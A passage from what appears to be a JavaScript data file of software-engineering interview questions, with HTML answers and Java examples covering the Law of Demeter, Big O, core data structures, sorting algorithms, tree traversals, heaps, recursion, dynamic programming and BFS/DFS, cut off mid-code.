<p><strong>Law of Demeter</strong> ("only talk to your immediate friends"): a method should call methods on its own fields, its parameters, and objects it creates — not on objects <em>returned by</em> those objects. Violations look like train wrecks:</p>
<pre>// Train wreck — coupled to the STRUCTURE of three objects:
if (customer.getWallet().getPrimaryCard().getExpiry()
            .isBefore(LocalDate.now())) {
    // ...
}
// This code breaks if: Wallet is renamed, a customer can have
// no wallet (NPE!), cards move to a payment service, expiry
// becomes a range... You've hard-coded a path through the
// object graph: customer → wallet → card → expiry.

// Tell, don't ask — push the question to where the data lives:
if (customer.hasExpiredPaymentMethod()) { ... }

class Customer {
    boolean hasExpiredPaymentMethod() {
        return wallet != null && wallet.hasExpiredCard();
    }
}
class Wallet {
    boolean hasExpiredCard() {
        return primaryCard != null && primaryCard.isExpired();
    }
}
// Each class asks only its DIRECT neighbor one question.
// Restructure the graph → only one class changes.</pre>
<p><strong>Why the two smells feed each other:</strong> a God Object is usually built <em>from</em> train wrecks — since it reaches through everyone's internals, all logic gravitates into it. Applying tell-don't-ask redistributes behavior to the objects that own the data, which is exactly how you dismantle a God Object: identify field clusters used by disjoint method groups, extract them, and <em>move the behavior with the data</em>.</p>
<p><strong>Nuance to volunteer:</strong> Demeter applies to <em>objects with behavior</em>, not plain data. Chaining through a DTO, a fluent builder, or a Stream pipeline (<code>list.stream().filter().map()</code>) is fine — those return new values, they don't expose a neighbor's internal structure.</p>
<div class="key-point">Train wrecks couple you to the shape of the whole object graph; tell-don't-ask moves behavior next to its data — the same move that breaks up God Objects. But don't cargo-cult it: fluent APIs and DTO chains are not Demeter violations.</div>`,
      },
    ],
  },

  // ========================= ALGORITHMS & DATA STRUCTURES =========================,
  {
    id: 'algorithms',
    name: 'Algorithms',
    icon: '🧮',
    questions: [
      {
        q: 'What is Big O Notation and why does it matter?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>Big O describes how cost grows as input grows — it's about asymptotic scaling, not wall-clock time, so it deliberately drops constants and lower-order terms. In practice I care about knowing the ladder (O(1), log n, n, n log n, n², 2ⁿ) and where my algorithm sits, and remembering it's worst-case unless stated — average and amortized often matter more, since a hash map is O(1) average but O(n) worst, and a dynamic-array push is amortized O(1). The senior nuance is that because Big O ignores constants, for small n a "worse" algorithm can win, and cache locality or a huge constant factor can make an O(n) beat an O(log n) in reality. It's a tool for reasoning about scale, not a substitute for measuring.</p></div>
<p><strong>Big O Notation</strong> describes how the runtime or memory of an algorithm grows as the input size grows. It answers: <em>"If I double my data, how much slower does it get?"</em></p>
<p><strong>Analogy:</strong> You're looking for a friend in a crowd.</p>
<ul>
<li><strong>O(1)</strong>: Your friend is always at the front door. Crowd size doesn't matter → <strong>constant</strong>.</li>
<li><strong>O(log n)</strong>: You split the crowd in half each time (like binary search) → <strong>logarithmic</strong>.</li>
<li><strong>O(n)</strong>: You check every person one by one → <strong>linear</strong>.</li>
<li><strong>O(n log n)</strong>: Like sorting a deck of cards efficiently (merge sort) → <strong>linearithmic</strong>.</li>
<li><strong>O(n²)</strong>: You compare every person with every other person → <strong>quadratic</strong>.</li>
</ul>
<pre>Speed ranking (best to worst):
  O(1) → O(log n) → O(n) → O(n log n) → O(n²) → O(2ⁿ) → O(n!)

Example with n = 1,000,000:
  O(1)      → 1 operation
  O(log n)  → ~20 operations
  O(n)      → 1,000,000 operations
  O(n²)     → 1,000,000,000,000 operations (too slow!)</pre>
<div class="key-point">In interviews, always state the Big O of your solution. If it's O(n²), ask yourself: "Can I do better?" — usually you can with the right data structure.</div>`,
      },
      {
        q: 'What is an Array vs a Linked List? When to use which?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>Arrays are contiguous memory — O(1) random access by index and, just as important, cache-friendly, which in practice makes them faster than the Big O suggests. Linked lists give O(1) insert or delete once you hold the node, and no resizing, but every access is a pointer chase with O(n) traversal and poor cache locality. So the honest real-world take is that I default to dynamic arrays (ArrayList, vector) for almost everything, because contiguous memory beats pointer-chasing on modern CPUs even for many mid-list operations. Linked lists earn their place for O(1) splicing, implementing queues and deques, or when you already hold the node reference, like an LRU cache. The classic gotcha is assuming linked-list insertion is cheap when finding the position is still O(n).</p></div>
<p><strong>Array</strong>: Elements stored in <strong>contiguous</strong> (side-by-side) memory. Access by index is instant.</p>
<p><strong>Linked List</strong>: Elements (nodes) stored anywhere in memory, each pointing to the next one.</p>
<p><strong>Analogy:</strong></p>
<ul>
<li><strong>Array</strong> = Movie theater seats in a row. Seat #5 is easy to find (just count). But inserting a new seat in the middle means moving everyone over.</li>
<li><strong>Linked List</strong> = Scavenger hunt. Each clue tells you where the next clue is. Easy to add/remove clues anywhere, but finding clue #5 means following all previous clues.</li>
</ul>
<pre>Array:      [10][20][30][40][50]   (contiguous in memory)
             0   1   2   3   4    (instant access by index)

Linked List: [10]→[20]→[30]→[40]→[50]→null
             (must walk from head to find element)</pre>
<table><tr><th>Operation</th><th>Array</th><th>Linked List</th></tr>
<tr><td>Access by index</td><td>O(1) ✅</td><td>O(n) ❌</td></tr>
<tr><td>Insert at beginning</td><td>O(n) ❌</td><td>O(1) ✅</td></tr>
<tr><td>Insert at end</td><td>O(1) amortized</td><td>O(1) with tail ptr</td></tr>
<tr><td>Delete from middle</td><td>O(n)</td><td>O(1) if you have the node</td></tr>
<tr><td>Memory</td><td>Compact</td><td>Extra space for pointers</td></tr></table>
<div class="key-point">Use <strong>Array</strong> when you need fast random access (arr[i]). Use <strong>Linked List</strong> when you frequently insert/delete at the beginning or middle.</div>`,
      },
      {
        q: 'What is a Stack and a Queue?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>Stack is LIFO, queue is FIFO — both restrict access to make intent clear and keep operations O(1). Stacks show up everywhere I actually work: the call stack, undo/redo, expression parsing and bracket matching, backtracking, and iterative DFS. Queues are for order-preserving processing — BFS, task scheduling, buffering, producer-consumer. I'd mention the useful variants: a deque (double-ended, the Swiss-army knife you can use as either), a priority queue (a heap, not really FIFO), and a circular buffer for fixed-size streams. The implementation note: back both with a dynamic array or linked list, and in Java specifically prefer <code>ArrayDeque</code> over the legacy <code>Stack</code> class.</p></div>
<p><strong>Stack</strong> = Last In, First Out (LIFO). Like a stack of plates — you add and remove from the top.</p>
<p><strong>Queue</strong> = First In, First Out (FIFO). Like a line at a coffee shop — first person in line is served first.</p>
<pre>Stack (LIFO):             Queue (FIFO):
  push(1) → [1]            enqueue(1) → [1]
  push(2) → [1,2]          enqueue(2) → [1,2]
  push(3) → [1,2,3]        enqueue(3) → [1,2,3]
  pop()   → 3  [1,2]       dequeue()  → 1  [2,3]
  pop()   → 2  [1]         dequeue()  → 2  [3]</pre>
<p><strong>Real-world uses:</strong></p>
<ul>
<li><strong>Stack</strong>: Browser back button (go back to the last page), Undo/Redo, function call stack, balanced parentheses check.</li>
<li><strong>Queue</strong>: Print queue (first document sent prints first), BFS traversal, task scheduling, message queues.</li>
</ul>
<pre>// Stack example: Check balanced parentheses
Input: "({[]})"
  '(' → push → ['(']
  '{' → push → ['(', '{']
  '[' → push → ['(', '{', '[']
  ']' → pop '[' matches → ['(', '{']
  '}' → pop '{' matches → ['(']
  ')' → pop '(' matches → []
  Stack empty → BALANCED ✅</pre>
<div class="key-point">Both Stack and Queue have <strong>O(1)</strong> push/pop and enqueue/dequeue. In Java: use <code>Deque</code> (ArrayDeque) for stack, <code>Queue</code> (LinkedList) for queue.</div>`,
      },
      {
        q: 'What is a Hash Map (Hash Table) and how does it work?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>A hash map gives O(1) average lookup by hashing the key to a bucket index; the interesting part is everything around collisions. Collisions are inevitable, so you resolve them with chaining (a list or tree per bucket) or open addressing, and to keep O(1) you resize and rehash once the load factor gets high — that resize is why it's amortized, not guaranteed, O(1). Worst case degrades to O(n) with bad hashing or adversarial collisions, which is a real DoS vector; Java 8 mitigates it by turning long chains into balanced trees for O(log n) per bucket. The gotchas I'd flag: a correct hashCode/equals contract is mandatory, and never mutate a key after insertion or you lose it.</p></div>
<p>A <strong>Hash Map</strong> stores key-value pairs and provides <strong>O(1)</strong> average lookup, insert, and delete.</p>
<p><strong>Analogy:</strong> A library filing system. Each book (value) has a unique call number (key). The librarian uses a formula (hash function) to calculate exactly which shelf to go to — no need to search every shelf.</p>
<pre>How it works:
1. hash("apple") → 3    (hash function converts key to array index)
2. Store at index 3: buckets[3] = { "apple": 5 }
3. Lookup: hash("apple") → 3 → buckets[3] → value is 5  ✅

Buckets array:
  [0] → null
  [1] → null
  [2] → {"banana": 2}
  [3] → {"apple": 5} → {"grape": 7}  ← collision! (linked list)
  [4] → null</pre>
<p><strong>Collision handling:</strong> When two keys hash to the same index:</p>
<ul>
<li><strong>Chaining</strong>: Each bucket holds a linked list of entries (most common).</li>
<li><strong>Open Addressing</strong>: Find the next empty slot (linear probing).</li>
</ul>
<pre>// Java example:
Map&lt;String, Integer&gt; prices = new HashMap&lt;&gt;();
prices.put("apple", 5);    // O(1)
prices.get("apple");        // O(1) → 5
prices.containsKey("apple"); // O(1) → true</pre>
<div class="key-point">Hash Map is the <strong>#1 most useful data structure</strong> in interviews. It solves "find duplicates", "count frequency", "two sum", and many more in O(n) instead of O(n²).</div>`,
      },
      {
        q: 'What is Binary Search and when can you use it?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>Binary search halves the search space each step for O(log n), but it has one hard precondition: the data must be sorted, or otherwise monotonic. I emphasize monotonicity because binary search is far more general than "find in a sorted array" — the real senior insight is binary search on the answer, where you search over a range of possible answers as long as feasibility is monotonic. The implementation is deceptively bug-prone: the classic mistakes are integer overflow in <code>mid = (lo + hi) / 2</code> — use <code>lo + (hi - lo) / 2</code> — and off-by-one or infinite loops from sloppy boundary updates. I keep the loop invariant explicit and decide half-open vs closed intervals up front.</p></div>
<p><strong>Binary Search</strong> finds a target in a <strong>sorted</strong> array by repeatedly cutting the search space in half. It's O(log n) — extremely fast.</p>
<p><strong>Analogy:</strong> Guessing a number between 1-100. Instead of guessing 1, 2, 3... you say "50?" → "Too high" → "25?" → "Too low" → "37?" Each guess eliminates half the numbers.</p>
<pre>Find 23 in [2, 5, 8, 12, 16, 23, 38, 56, 72, 91]:

Step 1: mid = 16, 23 > 16 → search right half
Step 2: mid = 38, 23 < 38 → search left half  
Step 3: mid = 23 → FOUND! ✅  (only 3 steps instead of 6)

In 1 billion items: only ~30 steps!</pre>
<pre>// Java implementation:
int binarySearch(int[] arr, int target) {
    int left = 0, right = arr.length - 1;
    while (left <= right) {
        int mid = left + (right - left) / 2;  // avoid overflow
        if (arr[mid] == target) return mid;
        else if (arr[mid] < target) left = mid + 1;
        else right = mid - 1;
    }
    return -1;  // not found
}</pre>
<p><strong>Can use binary search when:</strong></p>
<ul>
<li>Data is <strong>sorted</strong> (or has a monotonic property)</li>
<li>You can eliminate half the search space each step</li>
</ul>
<div class="key-point">Common trick: Binary search isn't just for sorted arrays. It works on any problem where you can answer "too high or too low?" — like finding minimum speed to finish on time, or the first bad version in a release.</div>`,
      },
      {
        q: 'Explain Bubble Sort, Selection Sort, and Insertion Sort.',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>All three are O(n²) and I'd never ship them for large data, but the distinctions still matter. Insertion sort is the one that earns real use: it's O(n) on nearly-sorted data, stable, in-place, and low-overhead, which is exactly why production sorts like Timsort and introsort switch to it for small subarrays. Selection sort minimizes the number of swaps — useful when writes are expensive — but is never adaptive. Bubble sort is basically a teaching tool whose only redeeming trait is detecting already-sorted input in one pass. The point I'd make is that constant factors and adaptivity matter at small n, which is why the "bad" O(n²) insertion sort beats the "good" O(n log n) sorts for tiny inputs.</p></div>
<p>These are three simple sorting algorithms, all O(n²). Great for learning but too slow for large data.</p>
<p><strong>1. Bubble Sort</strong> — Repeatedly swap adjacent elements if they're in the wrong order. Like bubbles rising to the surface.</p>
<pre>[5, 3, 8, 1] → compare pairs and swap:
  5,3 → swap → [3, 5, 8, 1]
  5,8 → ok   → [3, 5, 8, 1]
  8,1 → swap → [3, 5, 1, 8]  (8 "bubbled" to the end)
  ...repeat until sorted</pre>
<p><strong>2. Selection Sort</strong> — Find the minimum element and put it at the front. Like selecting the shortest person in a line and moving them to the left.</p>
<pre>[5, 3, 8, 1] → find min (1), swap with first:
  [1, 3, 8, 5] → find min in remaining (3), already in place:
  [1, 3, 8, 5] → find min in remaining (5), swap with 8:
  [1, 3, 5, 8] ✅</pre>
<p><strong>3. Insertion Sort</strong> — Build the sorted portion one element at a time. Like sorting a hand of playing cards — pick up each card and insert it in the right position.</p>
<pre>[5, 3, 8, 1]:
  [5] | 3, 8, 1  → insert 3 → [3, 5]
  [3, 5] | 8, 1  → insert 8 → [3, 5, 8]
  [3, 5, 8] | 1  → insert 1 → [1, 3, 5, 8] ✅</pre>
<table><tr><th>Algorithm</th><th>Best</th><th>Average</th><th>Worst</th><th>Stable?</th></tr>
<tr><td>Bubble</td><td>O(n)</td><td>O(n²)</td><td>O(n²)</td><td>Yes</td></tr>
<tr><td>Selection</td><td>O(n²)</td><td>O(n²)</td><td>O(n²)</td><td>No</td></tr>
<tr><td>Insertion</td><td>O(n)</td><td>O(n²)</td><td>O(n²)</td><td>Yes</td></tr></table>
<div class="key-point"><strong>Insertion Sort</strong> is the best of the three — it's fast on nearly-sorted data (O(n)) and is used as a subroutine in Timsort (Python/Java's default sort).</div>`,
      },
      {
        q: 'Explain Merge Sort. How does it work?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Merge sort is divide-and-conquer: recursively split, then merge sorted halves — and its selling points are a guaranteed O(n log n) worst case with no bad-pivot risk, plus stability. The cost is O(n) extra space for the merge, its main downside versus quicksort. Where it genuinely wins: it's stable (so it's Java's sort for objects), it's the natural fit for linked lists with no random access needed, and it's the basis for external sorting when data doesn't fit in RAM — you merge sorted runs from disk. So when an interviewer says "sort a 100GB file," merge sort is the answer. The summary I give: merge sort when you need stability or worst-case guarantees, quicksort when you want in-place speed on average.</p></div>
<p><strong>Merge Sort</strong> uses <strong>Divide and Conquer</strong>: split the array in half, sort each half, then merge the two sorted halves. Always O(n log n).</p>
<p><strong>Analogy:</strong> Sorting a deck of cards. Split the deck in half. Split each half again. Keep splitting until you have single cards (already sorted). Then merge pairs of sorted piles by comparing their top cards.</p>
<pre>Merge Sort [38, 27, 43, 3, 9, 82, 10]:

Split:  [38, 27, 43, 3]  |  [9, 82, 10]
Split:  [38, 27] [43, 3] | [9, 82] [10]
Split:  [38][27] [43][3] | [9][82] [10]

Merge:  [27,38] [3,43]   | [9,82] [10]
Merge:  [3, 27, 38, 43]  | [9, 10, 82]
Merge:  [3, 9, 10, 27, 38, 43, 82] ✅</pre>
<p><strong>How merging works:</strong></p>
<pre>Merge [3, 27] and [9, 10]:
  Compare 3 vs 9 → take 3  → [3]
  Compare 27 vs 9 → take 9  → [3, 9]
  Compare 27 vs 10 → take 10 → [3, 9, 10]
  Take remaining 27 → [3, 9, 10, 27] ✅</pre>
<pre>// Java implementation:
void mergeSort(int[] arr, int left, int right) {
    if (left >= right) return;
    int mid = (left + right) / 2;
    mergeSort(arr, left, mid);      // sort left half
    mergeSort(arr, mid + 1, right); // sort right half
    merge(arr, left, mid, right);   // merge sorted halves
}</pre>
<table><tr><th>Property</th><th>Value</th></tr>
<tr><td>Time</td><td>O(n log n) always</td></tr>
<tr><td>Space</td><td>O(n) extra (for temp arrays)</td></tr>
<tr><td>Stable</td><td>Yes</td></tr></table>
<div class="key-point">Merge Sort is <strong>guaranteed O(n log n)</strong> (no worst case like Quick Sort). Used for sorting linked lists and external sorting (data that doesn't fit in memory).</div>`,
      },
      {
        q: 'Explain Quick Sort. How does it work?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Quicksort partitions around a pivot and recurses — O(n log n) average, in-place, with excellent cache locality, which is why it's usually the fastest general-purpose sort in practice. The catch is the O(n²) worst case when pivots are consistently bad (already-sorted input with a naive first/last pivot) and that it isn't stable. The mitigations a senior should name: randomized or median-of-three pivot selection to make the worst case improbable, and introsort — what most standard libraries actually use — which starts with quicksort and bails to heapsort if recursion gets too deep, guaranteeing O(n log n). I'd also mention three-way partitioning (Dutch national flag) to handle many duplicate keys efficiently.</p></div>
<p><strong>Quick Sort</strong> picks a "pivot" element, partitions the array so everything smaller goes left and everything larger goes right, then recursively sorts left and right.</p>
<p><strong>Analogy:</strong> Organizing books on a shelf. Pick one book (pivot). Put all shorter books to the left, taller books to the right. Then do the same for each side.</p>
<pre>Quick Sort [8, 3, 1, 7, 0, 10, 2]:
  Pivot = 7
  Partition: [3, 1, 0, 2] [7] [8, 10]
            (all ≤ 7)      ↑   (all > 7)

  Sort left:  Pivot = 1 → [0] [1] [3, 2]
  Sort [3,2]: Pivot = 2 → [2] [3]

  Result: [0, 1, 2, 3, 7, 8, 10] ✅</pre>
<pre>// Java implementation:
void quickSort(int[] arr, int low, int high) {
    if (low >= high) return;
    int pivotIdx = partition(arr, low, high);
    quickSort(arr, low, pivotIdx - 1);
    quickSort(arr, pivotIdx + 1, high);
}

int partition(int[] arr, int low, int high) {
    int pivot = arr[high];  // pick last element as pivot
    int i = low - 1;
    for (int j = low; j < high; j++) {
        if (arr[j] <= pivot) {
            i++;
            swap(arr, i, j);
        }
    }
    swap(arr, i + 1, high);
    return i + 1;
}</pre>
<table><tr><th>Property</th><th>Value</th></tr>
<tr><td>Best/Average</td><td>O(n log n)</td></tr>
<tr><td>Worst case</td><td>O(n²) — when pivot is always min/max</td></tr>
<tr><td>Space</td><td>O(log n) — in-place</td></tr>
<tr><td>Stable</td><td>No</td></tr></table>
<div class="key-point">Quick Sort is <strong>faster in practice</strong> than Merge Sort due to cache locality (in-place). Fix worst case by choosing a <strong>random pivot</strong> or <strong>median-of-three</strong>.</div>`,
      },
      {
        q: 'What is a Binary Tree and a Binary Search Tree (BST)?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>A binary tree is just nodes with up to two children; a BST adds the ordering invariant — left subtree smaller, right subtree larger — which gives O(log n) search, insert, and delete. The crucial caveat I always raise is that O(log n) only holds if the tree is balanced: insert sorted data into a naive BST and it degenerates into a linked list, O(n). That's the whole reason self-balancing trees exist — red-black trees (what most TreeMaps use) and AVL trees rebalance on mutation to keep height logarithmic. An in-order traversal of a BST yields sorted order, a handy property. So in real code I reach for a balanced BST via the standard library's ordered map, never a hand-rolled plain BST.</p></div>
<p><strong>Binary Tree</strong>: Each node has at most 2 children (left and right).</p>
<p><strong>Binary Search Tree (BST)</strong>: A binary tree where left child < parent < right child. This ordering makes searching fast.</p>
<p><strong>Analogy:</strong> A BST is like a "20 Questions" game. "Is the number > 50?" → No → "Is it > 25?" → Yes → "Is it > 37?" Each question eliminates half the possibilities.</p>
<pre>BST Example:
           8
         /   \\
        3     10
       / \\      \\
      1   6     14
         / \\   /
        4   7 13

Search for 7:
  8 → 7 < 8 → go left
  3 → 7 > 3 → go right
  6 → 7 > 6 → go right
  7 → FOUND! ✅  (4 steps, not all 9 nodes)</pre>
<p><strong>BST operations:</strong></p>
<table><tr><th>Operation</th><th>Average</th><th>Worst (unbalanced)</th></tr>
<tr><td>Search</td><td>O(log n)</td><td>O(n)</td></tr>
<tr><td>Insert</td><td>O(log n)</td><td>O(n)</td></tr>
<tr><td>Delete</td><td>O(log n)</td><td>O(n)</td></tr></table>
<pre>// Java: Insert into BST
TreeNode insert(TreeNode root, int val) {
    if (root == null) return new TreeNode(val);
    if (val < root.val) root.left = insert(root.left, val);
    else root.right = insert(root.right, val);
    return root;
}</pre>
<div class="key-point">A BST becomes O(n) when it's unbalanced (like a linked list). That's why we use <strong>self-balancing BSTs</strong> like AVL Tree or Red-Black Tree (used in Java TreeMap).</div>`,
      },
      {
        q: 'What are tree traversals: Inorder, Preorder, Postorder, and Level-order?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>The three depth-first orders differ only by when you visit the node relative to its children: pre-order (node, left, right) is good for copying or serializing a tree; in-order (left, node, right) on a BST gives sorted output — that's the one to remember; post-order (left, right, node) processes children first, so it's for deletion or evaluating expression trees where you need results from below. Level-order is the breadth-first one — visit by depth using a queue — for shortest-path-by-edges or printing level by level. I'd note they're naturally recursive but can be done iteratively with an explicit stack, or Morris traversal for O(1) space, which matters when the tree is deep enough to blow the call stack.</p></div>
<p>Tree traversals are ways to visit every node in a tree. The order you visit determines the traversal type.</p>
<pre>Example tree:
        1
       / \\
      2   3
     / \\
    4   5</pre>
<p><strong>1. Inorder (Left → Root → Right):</strong> Visit left subtree, then root, then right.</p>
<pre>Result: [4, 2, 5, 1, 3]
Use: BST inorder gives nodes in SORTED order!</pre>
<p><strong>2. Preorder (Root → Left → Right):</strong> Visit root first, then left, then right.</p>
<pre>Result: [1, 2, 4, 5, 3]
Use: Copying/serializing a tree.</pre>
<p><strong>3. Postorder (Left → Right → Root):</strong> Visit children first, then root.</p>
<pre>Result: [4, 5, 2, 3, 1]
Use: Deleting a tree (delete children before parent), calculating folder sizes.</pre>
<p><strong>4. Level-order (BFS):</strong> Visit level by level, left to right.</p>
<pre>Result: [1, 2, 3, 4, 5]
Use: Finding shortest path, printing tree by levels.</pre>
<pre>// Java: Inorder traversal
void inorder(TreeNode node) {
    if (node == null) return;
    inorder(node.left);           // L
    System.out.print(node.val);   // Root
    inorder(node.right);          // R
}

// Level-order (BFS) with queue:
void levelOrder(TreeNode root) {
    Queue&lt;TreeNode&gt; q = new LinkedList&lt;&gt;();
    q.add(root);
    while (!q.isEmpty()) {
        TreeNode node = q.poll();
        System.out.print(node.val);
        if (node.left != null) q.add(node.left);
        if (node.right != null) q.add(node.right);
    }
}</pre>
<div class="key-point">Memory trick: <strong>In</strong>order = root <strong>In</strong> the middle. <strong>Pre</strong>order = root comes <strong>first</strong>. <strong>Post</strong>order = root comes <strong>last</strong>.</div>`,
      },
      {
        q: 'What is a Heap (Priority Queue) and how does it work?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>A heap is a complete binary tree with the heap property — parent greater than or equal to (or less than or equal to) its children — giving O(1) peek at the min or max and O(log n) insert and extract. The elegant part is it's stored in a flat array using index arithmetic (children at 2i+1 and 2i+2), so no pointers. It's the go-to whenever you repeatedly need the current extreme: priority queues, Dijkstra, task scheduling, and top-K or streaming-median problems. The key distinction to state is that a heap is only partially ordered, so it's great for min/max but useless for search or sorted iteration — don't reach for it when you need ordering. Heapsort falls out of it, and building a heap from an array is O(n), not O(n log n), which surprises people.</p></div>
<p>A <strong>Heap</strong> is a complete binary tree where the parent is always greater (Max-Heap) or smaller (Min-Heap) than its children. It gives you the min/max element in O(1).</p>
<p><strong>Analogy:</strong> A company hierarchy. In a Min-Heap, the CEO (smallest number) is always at the top. New employees (inserts) start at the bottom and "bubble up" if they outrank their manager.</p>
<pre>Min-Heap:
        1
       / \\
      3   5
     / \\
    7   4

- Root is always the MINIMUM (1)
- Not fully sorted! Just parent ≤ children

Operations:
  peek()   → 1          O(1)
  insert(2) → add at bottom, bubble up  O(log n)
  poll()   → remove root (1), move last to root, bubble down  O(log n)</pre>
<pre>// Java: PriorityQueue is a Min-Heap by default
PriorityQueue&lt;Integer&gt; minHeap = new PriorityQueue&lt;&gt;();
minHeap.add(5);  // [5]
minHeap.add(1);  // [1, 5]
minHeap.add(3);  // [1, 5, 3]
minHeap.poll();  // returns 1, heap becomes [3, 5]

// Max-Heap:
PriorityQueue&lt;Integer&gt; maxHeap = new PriorityQueue&lt;&gt;(Collections.reverseOrder());</pre>
<p><strong>Common uses:</strong></p>
<ul>
<li><strong>Top K elements</strong>: "Find the 10 largest numbers" → use a Min-Heap of size 10</li>
<li><strong>Merge K sorted lists</strong>: Put heads of all lists in a Min-Heap</li>
<li><strong>Dijkstra's shortest path</strong>: Always process the nearest unvisited node</li>
<li><strong>Task scheduling</strong>: Process highest-priority task first</li>
</ul>
<div class="key-point">A Heap is stored as an <strong>array</strong> under the hood. For node at index i: left child = 2i+1, right child = 2i+2, parent = (i-1)/2.</div>`,
      },
      {
        q: 'What is Recursion? Explain with examples.',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>Recursion solves a problem by reducing it to smaller instances until a base case — and the two things I check first are that there's a correct base case and that every call moves strictly toward it, or you get infinite recursion and a stack overflow. Its real strength is expressing naturally recursive structures cleanly: trees, graphs, divide-and-conquer, backtracking. The tradeoffs to name: each call costs a stack frame, so deep recursion risks overflow (an explicit stack or iteration is the fix), and naive recursion can recompute overlapping subproblems exponentially — exactly what memoization and DP fix. Tail-call optimization helps in languages that support it, but the JVM notably doesn't, so I don't rely on it in Java.</p></div>
<p><strong>Recursion</strong> = a function that calls itself to solve smaller versions of the same problem until it reaches a base case.</p>
<p><strong>Analogy:</strong> Russian nesting dolls (Matryoshka). Open a doll → there's a smaller doll inside. Keep opening until you reach the tiniest doll (base case). Then put them all back together.</p>
<pre>// Factorial: 5! = 5 × 4 × 3 × 2 × 1
int factorial(int n) {
    if (n <= 1) return 1;       // base case: stop here!
    return n * factorial(n - 1); // recursive case: call yourself
}

factorial(5)
  = 5 * factorial(4)
  = 5 * 4 * factorial(3)
  = 5 * 4 * 3 * factorial(2)
  = 5 * 4 * 3 * 2 * factorial(1)
  = 5 * 4 * 3 * 2 * 1
  = 120</pre>
<pre>// Fibonacci: 0, 1, 1, 2, 3, 5, 8, 13...
int fib(int n) {
    if (n <= 1) return n;        // base cases: fib(0)=0, fib(1)=1
    return fib(n - 1) + fib(n - 2);
}
// ⚠️ This is O(2ⁿ) — very slow! Use memoization (see DP question)</pre>
<p><strong>Two rules of recursion:</strong></p>
<ol>
<li><strong>Base case</strong>: When to stop (prevents infinite loop)</li>
<li><strong>Recursive case</strong>: Break the problem into a smaller version of itself</li>
</ol>
<div class="key-point">Every recursion can be converted to iteration (using a stack). Watch out for <strong>StackOverflowError</strong> if recursion is too deep. Optimize with <strong>memoization</strong> or <strong>tail recursion</strong>.</div>`,
      },
      {
        q: 'What is Dynamic Programming (DP)?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>DP applies when a problem has two properties: optimal substructure (the optimal answer is built from optimal sub-answers) and overlapping subproblems (the same sub-answers recur), so you compute each once and reuse it, turning exponential into polynomial. My approach is always to nail the recurrence and the state definition first — that's ninety percent of the work — then decide top-down memoization (recursion plus a cache, easy to write, computes only needed states) versus bottom-up tabulation (iterative, no recursion overhead, often lets you optimize space). The senior move is space optimization: many DPs only need the last row or two, dropping O(n²) space to O(n). The hard part in an interview isn't the code, it's recognizing it's DP and defining the state cleanly — I check whether greedy fails first.</p></div>
<p><strong>Dynamic Programming</strong> = solving complex problems by breaking them into overlapping subproblems and storing results to avoid recomputing them.</p>
<p><strong>Analogy:</strong> Imagine calculating "1+1+1+1+1+1+1+1". That's 8. Now add "+1". You don't start over! You remember the previous result (8) and just add 1 = 9. That's DP — <strong>remembering answers</strong>.</p>
<p><strong>Two approaches:</strong></p>
<pre>1. Top-Down (Memoization): Start from big problem, store results as you go
2. Bottom-Up (Tabulation): Start from smallest subproblems, build up

// Fibonacci WITHOUT DP → O(2ⁿ) 💀
fib(5) calls fib(4) and fib(3)
fib(4) calls fib(3) and fib(2)   ← fib(3) computed TWICE!

// Fibonacci WITH Memoization → O(n) ✅
int[] memo = new int[n + 1];
int fib(int n) {
    if (n <= 1) return n;
    if (memo[n] != 0) return memo[n];  // already computed!
    memo[n] = fib(n - 1) + fib(n - 2);
    return memo[n];
}

// Fibonacci Bottom-Up → O(n), O(1) space
int fib(int n) {
    int a = 0, b = 1;
    for (int i = 2; i <= n; i++) {
        int temp = a + b;
        a = b;
        b = temp;
    }
    return b;
}</pre>
<p><strong>When to use DP:</strong></p>
<ul>
<li>Problem has <strong>overlapping subproblems</strong> (same calculation repeated)</li>
<li>Problem has <strong>optimal substructure</strong> (optimal solution built from optimal sub-solutions)</li>
<li>Common DP problems: Fibonacci, Longest Common Subsequence, Knapsack, Coin Change</li>
</ul>
<div class="key-point">DP trick: If a recursion tree has repeated branches, it's a DP problem. Draw the recursion tree first, then add memoization.</div>`,
      },
      {
        q: 'Explain BFS (Breadth-First Search) and DFS (Depth-First Search).',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Both explore a graph, and the choice comes down to what you're after. BFS explores level by level using a queue, so it finds the shortest path in an unweighted graph — that's its killer feature — at the cost of O(width) memory. DFS goes deep using a stack or recursion, uses O(depth) memory, and is the natural fit for exhausting paths, detecting cycles, topological sort, and connected components. My rule: shortest-path-by-edges or "nearest" is BFS; exhaustive exploration, path existence, or structural questions is DFS. Both are O(V+E). The gotchas are remembering to mark visited nodes or you loop forever on cycles, and that DFS recursion can overflow the stack on deep graphs, so go iterative when depth is large.</p></div>
<p>BFS and DFS are two ways to visit all nodes in a graph or tree.</p>
<p><strong>Analogy — Searching for keys in a house:</strong></p>
<ul>
<li><strong>BFS</strong>: Check every room on floor 1 first, then every room on floor 2, etc. (level by level)</li>
<li><strong>DFS</strong>: Enter a room, if there's a door, go through it immediately. Keep going deeper until you hit a dead end, then backtrack.</li>
</ul>
<pre>Graph:
    1 --- 2
    |     |
    3 --- 4 --- 5

BFS (starting from 1): 1 → 2 → 3 → 4 → 5  (level by level)
DFS (starting from 1): 1 → 2 → 4 → 3 → 5  (go deep first)</pre>
<pre>// BFS uses a QUEUE:
void bfs(int start) {
    Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;();
    Set&lt;Integer&gt; visited = new HashSet&lt;&gt;();
    queue.add(start);
    visited.add(start);
    while (!queue.isEmpty()) {
        int node = queue.poll();
        for (int neighbor : graph.get(node)) {
            if (!visited.contains(neighbor)) {
                visited.add(neighbor);
                queue.add(neighbor);
            }
        }
    }
}

// DFS uses a STACK (or recursion):
void dfs(int node, Set&lt;Integer&gt; visited) {
    visited.add(node);
    for (int neighbor : graph.get(node)) {
